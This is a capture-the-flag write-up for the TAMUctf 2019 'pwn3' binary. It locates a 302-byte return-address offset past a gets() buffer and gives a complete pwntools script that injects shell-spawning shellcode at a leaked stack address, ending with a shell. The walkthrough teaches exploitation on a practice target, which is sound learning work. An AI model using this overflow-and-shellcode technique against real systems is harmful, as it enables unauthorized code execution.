
# pwn3

Program leaks a stack address

```shell
./pwn3

Take this, you might need it on your journey 0xff9156ee!
```

Source code, takes a **294** byte buffer into the vulnerable `gets()` function

```c
void echo(void)

{
  char buffer [294];
  
  printf("Take this, you might need it on your journey %p!\n",buffer);
  gets(buffer);
  return;
}
```

Taking a look at the stack, the input is at an offset of **0x12e** (**294**), and there's another **8** byte local variable, for a total of **302** bytes to overwrite the return address.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined echo()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     000105de(R)  
             undefined1[294]   Stack[-0x12e   buffer                                  XREF[2]:     000105b5(*), 
                                                                                                   000105ce(*)  
                             echo                                            XREF[4]:     Entry Point(*), main:00010615(c), 
                                                                                          00010700, 00010780(*)  
```

This can be confirmed by generating a cyclic pattern and lookup of the returrn address overwrite.

```
pwndbg> cyclic 350

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma

pwndbg> r

Starting program: /home/wither/NOTES/TAMUctf/2019/pwn3/pwn3
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Take this, you might need it on your journey 0xffffcd2e!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma
...
Invalid address 0x61626461
...

pwndbg> cyclic -l 0x61626461

Finding cyclic pattern of 4 bytes: b'adba' (hex: 0x61646261)
Found at offset 302
```

Put this into an exploit

```python
#!/usr/bin/python3

# import pwntools
from pwn import *
# import re for regex
from re import *

# only show errors
context.log_level = 'ERROR'

# start the binary process
context.binary = ELF("./pwn3", checksec=False)
p = process()

# grab the stack address leaked by the program
line = p.recvline().decode().strip()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

# generate shellcode that will open a shell
shellcode = asm(shellcraft.sh())
# add the shellcode + padding to fill 294B buffer + 8 byte local variable + address of shellcode to return to and execute
payload = shellcode + b"A" * (302 - len(shellcode)) + p32(leaked_addr)

# send the payload and enter interactive mode for the shell
p.sendline(payload)
p.interactive()
```

To get a shell

```shell
python3 exploit.py

$ ls
README.md  exploit.py  pwn3
```